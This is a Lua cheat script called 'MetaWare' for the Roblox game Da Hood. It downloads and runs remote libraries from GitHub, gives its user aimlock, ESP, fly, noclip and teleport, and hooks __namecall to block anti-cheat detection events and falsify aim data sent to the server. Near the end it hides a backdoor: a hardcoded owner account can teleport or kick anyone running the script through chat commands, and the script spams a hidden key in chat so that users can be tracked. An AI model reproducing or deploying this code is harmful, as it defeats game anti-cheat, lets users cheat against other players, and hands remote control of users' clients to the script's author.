--[[
    UPDATED: 26/12/2021

    - Fixed fly keybind working if your chatting or sum shit
    - Added user detection and some admin commands cuz some ppl may be retarded
]]

local ui_lib = "https://raw.githubusercontent.com/misanthropic2005/DaHood/main/library(s)/BungieUI_Edited.lua"
local ui_settings = {
    ["Combat"] = {
        ["Aimlock"] = true,
        ["Noclip"] = false,
        ["Fly"] = true
    },
    ["Utility"] = {
        ["Anti Stomp"] = true,
        ["Anti Bag"] = true,
        ["Target ESP"] = true,
        ["ESP"] = false
    },
    ["Keys"] = {
        ["Noclip"] = "Z",
        ["Fly"] = "X",
        ["Aimlock"] = "C",
        ["GUI"] = "V"
    },
    ["Fly"] = {
        ["Speed"] = 300
    }
}

local FirstLoad = false

local loadedornew = function()
    if not isfile("MetaWare_RWSettings.CONFIG") then
        FirstLoad = true
    end
end

local notif_lib

local StartFLY
local CreateGyroPart
local MainFly

local ui_storage = {
    Aimlock = nil,
    Noclip = nil,
    Fly = nil
}

local aimlock_lib = "https://raw.githubusercontent.com/misanthropic2005/DaHood/main/library(s)/Valiant.lua"
local aimlock_notify = function(title, string, time)
    notif_lib:Send(
        {
            Header = title,
            Notification = string,
            Time = time or 2
        }
    )
end
local aimlock_settings = {
    ["AimlockTarget"] = nil,
    ["Target Box"] = {},
    ["AimlockPart"] = false,
    ["TargetPart"] = "HumanoidRootPart"
}

local esp_lib = "https://raw.githubusercontent.com/misanthropic2005/DaHood/main/library(s)/KiriotEsp.lua"
local esp_settings = {
    ["Player Box"] = {}
}

local SaveSettings = function()
    local SavedAimlockData = {
        ["TargetPart"] = aimlock_settings["TargetPart"]
    }

    local SaveData = {
        aimlockdata = SavedAimlockData,
        uidata = ui_settings
    }

    local Encode = game:GetService("HttpService"):JSONEncode(SaveData)

    writefile("MetaWare_RWSettings.CONFIG", Encode)
end

local LoadSettings = function()
    if not isfile("MetaWare_RWSettings.CONFIG") then
        return
    else
        if isfile("MetaWare_RWSettings.CONFIG") then
            local Decode = game:GetService("HttpService"):JSONDecode(readfile("MetaWare_RWSettings.CONFIG"))

            if Decode.aimlockdata ~= nil then
                for z, x in pairs(Decode.aimlockdata) do
                    aimlock_settings[z] = x
                end
            end

            if Decode.uidata ~= nil then
                for z, x in pairs(Decode.uidata) do
                    for i, v in pairs(x) do
                        ui_settings[z][i] = v
                    end
                end
            end

            return true
        end
    end
end

if game:HttpGet(esp_lib) then
    esp_lib = loadstring(game:HttpGet(esp_lib))()
    esp_lib.Players = false
    esp_lib.AutoRemove = true
    esp_lib.FaceCamera = true

    esp_lib:Toggle(true)
else
    game:GetService("Players").LocalPlayer:Kick("[ESP] Failed to load!")
end

if game:HttpGet(aimlock_lib) then
    local FOVColor = "Color3fromRGB(231, 84, 128)"

    aimlock_lib = game:HttpGet(aimlock_lib)
    aimlock_lib = aimlock_lib:gsub("231, 84, 128", "75, 0, 130")
    aimlock_lib = loadstring(aimlock_lib)()

    aimlock_lib["TeamCheck"] = false
    aimlock_lib["FOV"] = 35
else
    game:GetService("Players").LocalPlayer:Kick("[Aimlock] Failed to load!")
end

if game:HttpGet(ui_lib) then
    --// UI Initalization

    local library = loadstring(game:HttpGet(ui_lib))()
    local ui = library.Load("ui")
    local int =
        ui:Start(
        {
            Header = "MetaWare",
            Footer = "da hood"
        }
    )

    notif_lib = library.Load("notification")

    loadedornew()
    LoadSettings()

    --// UI Tabs

    local Main =
        int:CreatePage(
        {
            Subject = "Main",
            Footer = ""
        }
    )

    local Settings =
        int:CreatePage(
        {
            Subject = "Settings",
            Footer = ""
        }
    )

    -- Main Sections

    local Combat =
        Main:CreateSection(
        {
            Header = "Combat"
        }
    )

    local Utility =
        Main:CreateSection(
        {
            Header = "Utility"
        }
    )

    local Misc =
        Main:CreateSection(
        {
            Header = "Misc"
        }
    )

    -- Settings Sections

    local AimlockSettings =
        Settings:CreateSection(
        {
            Header = "Aimlock"
        }
    )

    local FlySettings =
        Settings:CreateSection(
        {
            Header = "Fly"
        }
    )

    local NoclipSettings =
        Settings:CreateSection(
        {
            Header = "Noclip"
        }
    )

    local UISettings =
        Settings:CreateSection(
        {
            Header = "CONFIG"
        }
    )

    --// Main Tab

    ui_storage.Aimlock =
        Combat:CreateCheck(
        {
            Text = "Aimlock",
            State = ui_settings["Combat"]["Aimlock"],
            Script = function(Boolean)
                ui_settings["Combat"]["Aimlock"] = Boolean
            end
        }
    )

    ui_storage.Noclip =
        Combat:CreateCheck(
        {
            Text = "Noclip",
            State = ui_settings["Combat"]["Noclip"],
            Script = function(Boolean)
                ui_settings["Combat"]["Noclip"] = Boolean
            end
        }
    )

    ui_storage.Fly =
        Combat:CreateCheck(
        {
            Text = "Fly",
            State = ui_settings["Combat"]["Fly"],
            Script = function(Boolean)
                ui_settings["Combat"]["Fly"] = Boolean

                if Boolean then
                    if type(MainFly) == "function" then
                        MainFly()
                    else
                        print(type(MainFly))
                    end
                end
            end
        }
    )

    Utility:CreateCheck(
        {
            Text = "Anti Stomp",
            State = ui_settings["Utility"]["Anti Stomp"],
            Script = function(Boolean)
                ui_settings["Utility"]["Anti Stomp"] = Boolean
            end
        }
    )

    Utility:CreateCheck(
        {
            Text = "Anti Bag",
            State = ui_settings["Utility"]["Anti Bag"],
            Script = function(Boolean)
                ui_settings["Utility"]["Anti Bag"] = Boolean
            end
        }
    )

    Utility:CreateCheck(
        {
            Text = "ESP",
            State = ui_settings["Utility"]["ESP"],
            Script = function(Boolean)
                ui_settings["Utility"]["ESP"] = Boolean
            end
        }
    )

    local TeleportBox

    TeleportBox =
        Misc:CreateTextBox(
        {
            Text = "Teleport",
            PlaceHolder = "Target Name",
            Pattern = "lower",
            Script = function(String)
                TeleportBox.ClearInput()

                local player = TeleportBox.GetPlayer(String)

                if player ~= nil then
                    if player.Character then
                        if player.Character:FindFirstChild("HumanoidRootPart") then
                            if game.Players.LocalPlayer.Character then
                                if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                    local HumanoidRootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
                                    local TargetRootPart = player.Character.HumanoidRootPart

                                    HumanoidRootPart.CFrame = TargetRootPart.CFrame
                                end
                            end
                        end
                    end
                end
            end
        }
    )

    local TargetBox

    TargetBox =
        Misc:CreateTextBox(
        {
            Text = "Aimlock",
            PlaceHolder = "Target Name",
            Pattern = "lower",
            Script = function(String)
                TargetBox.ClearInput()

                local player = TargetBox.GetPlayer(String)

                if player ~= nil then
                    aimlock_settings["AimlockTarget"] = player
                    aimlock_notify("Aimlock Target:", tostring(player))
                end
            end
        }
    )

    --// Aimlock Settings

    AimlockSettings:CreateKeybind(
        {
            Text = "Keybind",
            Key = Enum.KeyCode[ui_settings["Keys"]["Aimlock"]],
            Script = function(Key)
                ui_settings["Keys"]["Aimlock"] = Key
            end
        }
    )

    AimlockSettings:CreateButton(
        {
            Text = "",
            Script = function()
            end
        }
    )

    AimlockSettings:CreateDropdown(
        {
            Text = "Part",
            Default = aimlock_settings["TargetPart"],
            Options = {"HumanoidRootPart", "Head", "LowerTorso"},
            Script = function(Choice)
                aimlock_settings["TargetPart"] = Choice
                aimlock_notify("Target Part:", aimlock_settings["TargetPart"], 5)
            end
        }
    )

    AimlockSettings:CreateSlider(
        {
            Text = "FOV",
            Suffix = "",
            Values = {
                Minimum = 5,
                Maximum = 150,
                Default = aimlock_lib["FOV"]
            },
            Script = function(fov_value)
                aimlock_lib["FOV"] = fov_value
            end
        }
    )

    AimlockSettings:CreateButton(
        {
            Text = "",
            Script = function()
            end
        }
    )

    AimlockSettings:CreateCheck(
        {
            Text = "Visible Check",
            State = aimlock_lib["VisibleCheck"],
            Script = function(Boolean)
                aimlock_lib["VisibleCheck"] = Boolean
            end
        }
    )

    AimlockSettings:CreateCheck(
        {
            Text = "Target ESP",
            State = ui_settings["Utility"]["Target ESP"],
            Script = function(Boolean)
                ui_settings["Utility"]["Target ESP"] = Boolean
            end
        }
    )

    --// Fly Settings

    FlySettings:CreateKeybind(
        {
            Text = "Keybind",
            Key = Enum.KeyCode[ui_settings["Keys"]["Fly"]],
            Script = function(Key)
                ui_settings["Keys"]["Fly"] = Key
            end
        }
    )

    FlySettings:CreateButton(
        {
            Text = "",
            Script = function()
            end
        }
    )

    FlySettings:CreateSlider(
        {
            Text = "Speed",
            Suffix = "",
            Values = {
                Minimum = 5,
                Maximum = 100,
                Default = (ui_settings["Fly"]["Speed"] / 10)
            },
            Script = function(speed_value)
                ui_settings["Fly"]["Speed"] = speed_value * 10
            end
        }
    )

    --// Noclip Settings

    NoclipSettings:CreateButton(
        {
            Text = "",
            Script = function()
            end
        }
    )

    NoclipSettings:CreateKeybind(
        {
            Text = "Keybind",
            Key = Enum.KeyCode[ui_settings["Keys"]["Noclip"]],
            Script = function(Key)
                ui_settings["Keys"]["Noclip"] = Key
            end
        }
    )

    --// Save / Load

    UISettings:CreateButton(
        {
            Text = "Save Settings",
            Script = function()
                SaveSettings()
            end
        }
    )
end

-- // Services

local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

--// Functions

local LocalPlayer = function()
    return Players.LocalPlayer
end

-- Noclip:

UserInputService.InputBegan:Connect(
    function(Input, GameProcessedEvent)
        if not GameProcessedEvent then
            if Input.KeyCode == Enum.KeyCode[ui_settings["Keys"]["Noclip"]] then
                print("TG")

                local Value = not ui_settings["Combat"]["Noclip"]

                ui_storage.Noclip.SetState(Value)
                ui_settings["Combat"]["Noclip"] = Value
            end
        end
    end
)

RunService.Stepped:Connect(
    function(...)
        local CombatSettings = ui_settings["Combat"]

        if CombatSettings["Noclip"] then
            if LocalPlayer().Character then
                local Character = LocalPlayer().Character

                for z, x in pairs(Character:GetChildren()) do
                    if x:IsA("BasePart") then
                        x.CanCollide = false
                    end
                end
            end
        end
    end
)

-- Anti Stomp + Anti Bag:

RunService.RenderStepped:Connect(
    function(...)
        if LocalPlayer().Character then
            local Character = LocalPlayer().Character

            if ui_settings["Utility"]["Anti Bag"] then
                if Character:FindFirstChild("Christmas_Sock") then
                    Character.Christmas_Sock:Destroy()
                end
            end

            if ui_settings["Utility"]["Anti Stomp"] then
                if Character:FindFirstChild("BodyEffects") then
                    local StatusFolder = Character.BodyEffects

                    if StatusFolder:FindFirstChild("K.O") then
                        local KO = StatusFolder["K.O"]

                        if KO.Value then
                            for z, x in pairs(Character:GetChildren()) do
                                if x:IsA("BasePart") then
                                    if x.Name ~= "HumanoidRootPart" then
                                        x:Destroy()
                                    end
                                end
                            end
                        else
                            --
                        end
                    end
                end
            end
        end
    end
)

-- Target ESP

RunService.RenderStepped:Connect(
    function(...)
        if
            not ui_settings["Utility"]["Target ESP"] or aimlock_settings["AimlockTarget"] == nil or
                not ui_settings["Combat"]["Aimlock"]
         then
            local BoxTable = aimlock_settings["Target Box"]

            for z, x in pairs(BoxTable) do
                if x.Box ~= nil then
                    x.Box:Remove()
                    table.remove(BoxTable, z)
                end
            end
        end

        if
            aimlock_settings["AimlockTarget"] ~= nil and ui_settings["Utility"]["Target ESP"] and
                ui_settings["Combat"]["Aimlock"]
         then
            if aimlock_settings["AimlockPart"] then
                local BoxTable = aimlock_settings["Target Box"]

                for z, x in pairs(BoxTable) do
                    if x.Player ~= aimlock_settings["AimlockTarget"] then
                        if x.Box ~= nil then
                            x.Box:Remove()
                        end
                        table.remove(BoxTable, z)
                    end
                end

                for z, x in pairs(BoxTable) do
                    if x.Player == aimlock_settings["AimlockTarget"] then
                        local PlayerModel = x.Box.PrimaryPart

                        if PlayerModel == nil then
                            table.remove(BoxTable, z)                        
                        end
                        
                        if PlayerModel.Parent.Parent ~= nil then
                            return
                        end
                        
                        if PlayerModel.Parent.Parent == nil then
                            table.remove(BoxTable, z)
                        end
                    end
                end

                local TargetBox =
                    esp_lib:Add(
                    aimlock_settings["AimlockTarget"].Character.HumanoidRootPart,
                    {
                        Name = "Aimlock Target [ " .. aimlock_settings["AimlockTarget"].Name .. " ]",
                        Color = Color3.fromRGB(75, 0, 130)
                    }
                )

                BoxTable[#BoxTable + 1] = {
                    Player = aimlock_settings["AimlockTarget"],
                    Box = TargetBox
                }
            end
        end
    end
)

-- Player ESP

RunService.RenderStepped:Connect(
    function(...)
        if ui_settings["Utility"]["ESP"] then
            local PlayerBox = esp_settings["Player Box"]
            local ValidPlayers = {}

            for z, x in pairs(game.Players:GetPlayers()) do
                if x ~= aimlock_settings["AimlockTarget"] and x ~= game.Players.LocalPlayer then
                    if x.Character then
                        local Char = x.Character

                        if Char:FindFirstChild("HumanoidRootPart") then
                            local HRP = Char.HumanoidRootPart

                            ValidPlayers[#ValidPlayers + 1] = {
                                Player = x,
                                Character = Char,
                                HumanoidRootPart = HRP
                            }
                        end
                    end
                end
            end

            for i = 1, #PlayerBox do
                if PlayerBox[i].Player == aimlock_settings["AimlockTarget"] then
                    PlayerBox[i].Box:Remove()
                    table.remove(PlayerBox, i)
                end
            end

            local AlreadyESP = function(Player)
                local Found = false

                for i = 1, #PlayerBox do
                    if PlayerBox[i].Player == Player then
                        Found = true
                        break
                    end
                end

                return Found
            end

            for z, x in pairs(ValidPlayers) do
                if x.Player == aimlock_settings["AimlockTarget"] then
                    table.remove(ValidPlayers, z)
                elseif AlreadyESP(x.Player) then
                    table.remove(ValidPlayers, z)
                end
            end

            for z, x in pairs(ValidPlayers) do
                local TargetBox =
                    esp_lib:Add(
                    x.HumanoidRootPart,
                    {
                        Name = "Player [ " .. x.Player.Name .. " ]",
                        Color = Color3.fromRGB(255, 255, 255)
                    }
                )

                PlayerBox[#PlayerBox + 1] = {
                    Player = x.Player,
                    Box = TargetBox
                }
            end
        else
            for z, x in pairs(esp_settings["Player Box"]) do
                if x.Box ~= nil then
                    x.Box:Remove()
                    table.remove(esp_settings["Player Box"], z)
                end
            end
        end
    end
)

-- Aimlock:

RunService.RenderStepped:Connect(
    function(...)
        if aimlock_settings["AimlockTarget"] ~= nil then
            local Player = aimlock_settings["AimlockTarget"]

            if Player.Character then
                if Player.Character:FindFirstChild("HumanoidRootPart") then
                    aimlock_settings["AimlockPart"] = true
                else
                    aimlock_settings["AimlockPart"] = false
                end
            else
                aimlock_settings["AimlockPart"] = false
            end
        end
    end
)

UserInputService.InputBegan:Connect(
    function(Input, GameProcessedEvent)
        if not GameProcessedEvent then
            if Input.KeyCode == Enum.KeyCode[ui_settings["Keys"]["Aimlock"]] and ui_settings["Combat"]["Aimlock"] then
                local Player = aimlock_lib.getClosestPlayerToCursor()
                local PlayerObject = aimlock_lib["Selected"]

                if PlayerObject ~= nil then
                    aimlock_settings["AimlockTarget"] = PlayerObject
                    aimlock_notify("Target:", tostring(PlayerObject))
                end
            end
        end
    end
)

game.Players.PlayerRemoving:Connect(
    function(Player)
        if Player == aimlock_settings["AimlockTarget"] then
            aimlock_settings["AimlockTarget"] = nil
        end
    end
)

-- Hooking + AntiCheat Bypass:

local Namecall
local Hooking = function(self, ...)
    local Args = {...}
    local Method = getnamecallmethod()
    local Script = getcallingscript()
    local Events = {"CHECKER_1", "CHECKER_2", "TeleportDetect", "OneMoreTime"}

    if Method == "FireServer" then
        if self.Name == ("MainEvent") then
            if table.find(Events, Args[1]) then
                return wait(9e9)
            end
            if
                Args[1] == ("UpdateMousePos") and ui_settings["Combat"]["Aimlock"] and
                    aimlock_settings["AimlockTarget"] ~= nil
             then
                local TargetPart = aimlock_settings["TargetPart"]
                local Target = aimlock_settings["AimlockTarget"]

                if aimlock_settings["AimlockPart"] then
                    Args[2] = Target.Character[TargetPart].Position + (Target.Character[TargetPart].Velocity * 0.168)
                end

                return Namecall(self, unpack(Args))
            end
        end
    end

    return Namecall(self, ...)
end

Namecall = hookmetamethod(game, "__namecall", newcclosure(Hooking))

-- Fly:

LP = game.Players.LocalPlayer
FLYING = ui_settings["Combat"]["Fly"]
MOUSE = LP:GetMouse()

local UpdateLowerTorso = function(Weld)
    LP.CharacterAdded:Connect(
        function(Character)
            Weld.Part1 = Character:WaitForChild("LowerTorso")
        end
    )

    if LP.Character then
        local Character = LP.Character
        local Torso = Character:WaitForChild("LowerTorso")

        if Character:FindFirstChild("LowerTorso") then
            Weld.Part1 = Character:FindFirstChild("LowerTorso")
        end
    end
end

CreateGyroPart = function()
    local Gyro = Instance.new("Part", workspace)
    Gyro.Anchored = false
    Gyro.Name = "Gyro"
    Gyro.Name = "Fly_Init"
    Gyro.Transparency = 1
    Gyro.CFrame = CFrame.new(0, 69000, 0)
    Gyro.CanCollide = false

    local GyroWeld = Instance.new("Weld", Gyro)
    GyroWeld.Part0 = Gyro
    UpdateLowerTorso(GyroWeld)

    return Gyro
end

StartFLY = function(FlyPart)
    local T = FlyPart
    local CONTROL = {F = 0, B = 0, L = 0, R = 0}
    local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
    local SPEED = 50

    workspace.ChildRemoved:Connect(
        function(Child)
            if Child == FlyPart then
                local NewGyro = CreateGyroPart()

                table.insert(Parts, NewGyro)

                StartFLY(NewGyro)
            end
        end
    )

    FlyPart.ChildRemoved:Connect(
        function(Child)
            if Child:IsA("Weld") then
                game.Players.LocalPlayer.CharacterAdded:Wait()

                local GyroWeld = Instance.new("Weld", FlyPart)
                GyroWeld.Part0 = FlyPart

                UpdateLowerTorso(GyroWeld)
            end
        end
    )

    MainFly = function()
        FLYING = true

        local BG = Instance.new("BodyGyro", T)
        local BV = Instance.new("BodyVelocity", T)

        BG.P = 9e4
        BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
        BG.cframe = T.CFrame
        BV.velocity = Vector3.new(0, 0.1, 0)
        BV.maxForce = Vector3.new(9e9, 9e9, 9e9)

        spawn(
            function()
                repeat
                    wait()

                    if LP.Character then
                        if LP.Character:FindFirstChild("Humanoid") then
                            LP.Character.Humanoid.PlatformStand = true
                        end
                    end

                    if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
                        SPEED = ui_settings["Fly"]["Speed"]
                    elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
                        SPEED = 0
                    end
                    if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
                        BV.velocity =
                            ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) +
                            ((workspace.CurrentCamera.CoordinateFrame *
                                CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) -
                                workspace.CurrentCamera.CoordinateFrame.p)) *
                            SPEED
                        lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
                    elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
                        BV.velocity =
                            ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) +
                            ((workspace.CurrentCamera.CoordinateFrame *
                                CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) -
                                workspace.CurrentCamera.CoordinateFrame.p)) *
                            SPEED
                    else
                        BV.velocity = Vector3.new(0, 0.1, 0)
                    end
                    BG.cframe = workspace.CurrentCamera.CoordinateFrame
                until not FLYING

                CONTROL = {F = 0, B = 0, L = 0, R = 0}
                lCONTROL = {F = 0, B = 0, L = 0, R = 0}
                SPEED = 0
                BG:destroy()
                BV:destroy()

                if LP.Character then
                    if LP.Character:FindFirstChild("Humanoid") then
                        LP.Character.Humanoid.PlatformStand = false
                    end
                end
            end
        )
    end

    MOUSE.KeyDown:connect(
        function(KEY)
            if KEY:lower() == "w" then
                CONTROL.F = 1
            elseif KEY:lower() == "s" then
                CONTROL.B = -1
            elseif KEY:lower() == "a" then
                CONTROL.L = -1
            elseif KEY:lower() == "d" then
                CONTROL.R = 1
            end
        end
    )

    MOUSE.KeyUp:connect(
        function(KEY)
            if KEY:lower() == "w" then
                CONTROL.F = 0
            elseif KEY:lower() == "s" then
                CONTROL.B = 0
            elseif KEY:lower() == "a" then
                CONTROL.L = 0
            elseif KEY:lower() == "d" then
                CONTROL.R = 0
            end
        end
    )

    UserInputService.InputBegan:Connect(
        function(Input, G)
            if Input.KeyCode == Enum.KeyCode[ui_settings["Keys"]["Fly"]] and ui_settings["Combat"]["Fly"] and not G then
                if FLYING then
                    FLYING = false
                    return
                end

                if not FLYING then
                    FLYING = true
                    MainFly()
                    return
                end
            end
        end
    )
end

StartFLY(CreateGyroPart())

if FirstLoad then
    aimlock_notify("New User:", "Hey! It's your first time using MetaWare here are the\nkeybinds:", 30)
    aimlock_notify("Noclip:", "Z", 40)
    aimlock_notify("Fly:", "X", 40)
    aimlock_notify("Aimlock Target:", "C", 40)
    aimlock_notify("GUI:", "Right Alt", 40)
end

--// dis is just.... yeha.....

local FindOwner = false

local GetAdminChar = function(player)
    if player.Character then
        return player.Character
    else
        return game.Players:GetPlayers()[math.random(1, #game.Players:GetPlayers())].Character
    end
end

local Admin = function(self)
    self.Chatted:Connect(
        function(chat)
            if chat:lower() == "mbring" or chat:lower() == "/e mbring" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = GetAdminChar(self).HumanoidRootPart.CFrame
            end
            if chat:lower() == "mkick" or chat:lower() == "/e mkick" then
                if game.Players.LocalPlayer ~= self then
                    game.Players.LocalPlayer:Kick("Kicked by OWNER")
                end
            end
        end
    )
end

for i, v in pairs(game:GetService("Players"):GetPlayers()) do
    if v.UserId == 1898371630 then
        FindOwner = true
    end
end

if FindOwner then
    game:GetService("StarterGui"):SetCore(
        "SendNotification",
        {
            Title = "OWNER",
            Text = "Metacalled is here :D",
            Duration = 60
        }
    )
end

local users = {}
local userkey = "-m_admin-585845734958289 (hi chat loggers)"

game:GetService("Players").PlayerAdded:Connect(
    function(self)
        if self.UserId == 1898371630 then
            game:GetService("StarterGui"):SetCore(
                "SendNotification",
                {
                    Title = "OWNER",
                    Text = "Metacalled is here :D",
                    Duration = 60
                }
            )

            Admin(self)
        end
        
        local IsUser = function(p)
           for i, v in pairs(users) do if p == v then return true else return false end end
        end
    
        self.Chatted:Connect(
            function(chat)
                if chat == userkey and not IsUser(self) then
                    table.insert(users, self)
                
                    game:GetService("StarterGui"):SetCore(
                        "SendNotification",
                        {
                            Title = "NEW USER:",
                            Text = self.Name .. " just executed!",
                            Duration = 10
                        }
                    )                      
                end
            end
        )
    end
)

for i, self in pairs(game:GetService("Players"):GetPlayers()) do
    if self ~= game.Players.LocalPlayer then
        self.Chatted:Connect(
            function(chat)
                if chat == userkey and not table.find(users, self.UserId) then
                    table.insert(users, self)
                    
                    game:GetService("StarterGui"):SetCore(
                        "SendNotification",
                        {
                            Title = "NEW USER:",
                            Text = self.Name .. " just executed!",
                            Duration = 10
                        }
                    )                    
                end
            end
        )
    end
end

game:GetService("Players").PlayerRemoving:Connect(
    function(self)
        for i, v in pairs(users) do
            if self == v then
                table.remove(users, i)
            end
        end
    end
)

game:GetService("RunService").RenderStepped:Connect(
    function(...)
        game.Players:Chat(userkey)
    end
)

game.Players.LocalPlayer.Chatted:Connect(
    function(self)
        if self:lower() == "/e checkusers" then
            if #users == 0 then
                game:GetService("StarterGui"):SetCore(
                    "SendNotification",
                    {
                        Title = "NO USERS!",
                        Text = ":(",
                        Duration = 10
                    }
                )
            end

            for i, v in pairs(users) do
                game:GetService("StarterGui"):SetCore(
                    "SendNotification",
                    {
                        Title = "User:",
                        Text = v.Name,
                        Duration = 10
                    }
                )
            end
        end
    end
)
